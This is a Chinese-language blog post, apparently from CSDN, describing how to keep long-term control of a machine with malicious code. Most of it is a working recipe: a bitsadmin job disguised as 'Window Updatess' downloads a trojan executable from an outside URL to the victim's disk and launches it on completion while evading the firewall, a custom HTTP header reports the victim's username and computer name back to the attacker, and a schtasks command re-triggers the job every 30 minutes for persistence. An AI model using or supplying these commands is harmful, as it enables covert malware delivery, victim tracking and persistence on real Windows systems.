---
title: 使用计划任务和bitsadmin实现恶意代码长期控守
tags: [windows]
date: 2017-02-26 22:46
---
使用计划任务和bitsadmin实现恶意代码长期控守第一步：文件下载由于我们想要不被计算器防火墙拦截的下载木马文件，所以考虑使用Windows自带的命令行工具。使用bitsadmin下载工具就可以做到这点。 这是写好保存的.ps1脚本# 创建一个新的Job,命名为Window Updatessbitsadmin /Create Window Updatess# 指定一个下载任务和下载的地址
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="使用计划任务和bitsadmin实现恶意代码长期控守">使用计划任务和bitsadmin实现恶意代码长期控守</h1>
<h2 id="第一步文件下载">第一步：文件下载</h2>
<p>由于我们想要不被计算器防火墙拦截的下载木马文件，所以考虑使用Windows自带的命令行工具。使用bitsadmin下载工具就可以做到这点。 <br>
这是写好保存的.ps1脚本</br></p>
<pre class="prettyprint"><code class=" hljs vala"><span class="hljs-preprocessor"># 创建一个新的Job,命名为Window Updatess</span>
bitsadmin /Create <span class="hljs-string">"Window Updatess"</span>

<span class="hljs-preprocessor"># 指定一个下载任务和下载的地址</span>
bitsadmin /AddFile <span class="hljs-string">"Window Updatess"</span> http:<span class="hljs-comment">//ctf5.shiyanbar.com/423/re/rev2.exe d:\100w.exe</span>

<span class="hljs-preprocessor"># 设置触发事件的条件</span>
bitsadmin /SetNotifyFlags <span class="hljs-string">"Window Updatess"</span> <span class="hljs-number">1</span>

<span class="hljs-preprocessor"># 设置作业完成数据传输或作业进入状态将运行的命令行程序</span>
bitsadmin /SetNotifyCmdLine <span class="hljs-string">"Window Updatess"</span> <span class="hljs-string">"%COMSPEC%"</span> <span class="hljs-string">"cmd.exe /c bitsadmin.exe /complete \"Window Updatess\" &amp;&amp; start /B d:\100w.exe"</span>

<span class="hljs-preprocessor"># 设置下载任务出错时重传的延迟</span>
bitsadmin /SetMinRetryDelay <span class="hljs-string">"Window Updatess"</span> <span class="hljs-number">120</span>

<span class="hljs-preprocessor"># 添加自定义的HTTP头</span>
bitsadmin /SetCustomHeaders <span class="hljs-string">"Window Updatess"</span> <span class="hljs-string">"Caller:%USERNAME%@%COMPUTERNAME"</span>

<span class="hljs-preprocessor"># 激活新的任务</span>
bitsadmin /Resume <span class="hljs-string">"Window Updatess"</span> </code></pre>
<p>在PowerShell中执行 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170226224146382?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
创建新的Job <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170226224241226?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
最后激活Job <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170226224525681?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
这样，我们就实现了第一步，就是利用Windows自带的命令行工具实现下载木马，并且不被防火墙拦截。</br></img></br></br></img></br></br></img></br></p>
<h2 id="第二步监控木马">第二步：监控木马</h2>
<p>当受害机器下载执行木马后，为了实现对木马的监控，可以使用服务器实现。由于这个下载本质是也是使用HTTP进行的一次GET请求，也就是说会发送HTTP请求头。我们在ps1脚本中设置了HTTP头：</p>
<pre class="prettyprint"><code class=" hljs perl"><span class="hljs-comment">## 添加自定义的HTTP头</span>
bitsadmin /SetCustomHeaders <span class="hljs-string">"Window Updatess"</span> <span class="hljs-string">"Caller:<span class="hljs-variable">%USERNAME</span><span class="hljs-variable">%@</span><span class="hljs-variable">%COMPUTERNAME</span>"</span></code></pre>
<p>这样，就可以做到监控木马，第二步完成</p>
<h2 id="第三步建立计划任务形式的加载bitsadmin">第三步：建立计划任务形式的加载bitsadmin</h2>
<p>使用schtasks命令建立计划任务来加载bitsadmin执行”Window Update“ <br>
给出具体命令（命令中有标注，具体执行时要去除）</br></p>
<pre class="prettyprint"><code class=" hljs sql">schtasks /<span class="hljs-operator"><span class="hljs-keyword">Create</span> /TN <span class="hljs-string">"Window Update"</span> /TR <span class="hljs-string">"%WINDIR%\system32\bitsadmin.exe /resume \"Windows Update\""</span> /sc <span class="hljs-keyword">minute</span> /MO <span class="hljs-number">30</span> /ED(此任务的最后一次运行时间) <span class="hljs-number">2017</span>/<span class="hljs-number">03</span>/<span class="hljs-number">01</span> /ET <span class="hljs-number">12</span>:<span class="hljs-number">00</span>(最后一次的运行时间) /Z(在任务运行完毕后删除任务) /IT(标志此任务只有在登录情况下才运行) /RU %USERNAME%(指定运行的用户账户)  </span></code></pre>
<p>执行结果 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170226224546697?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p></div>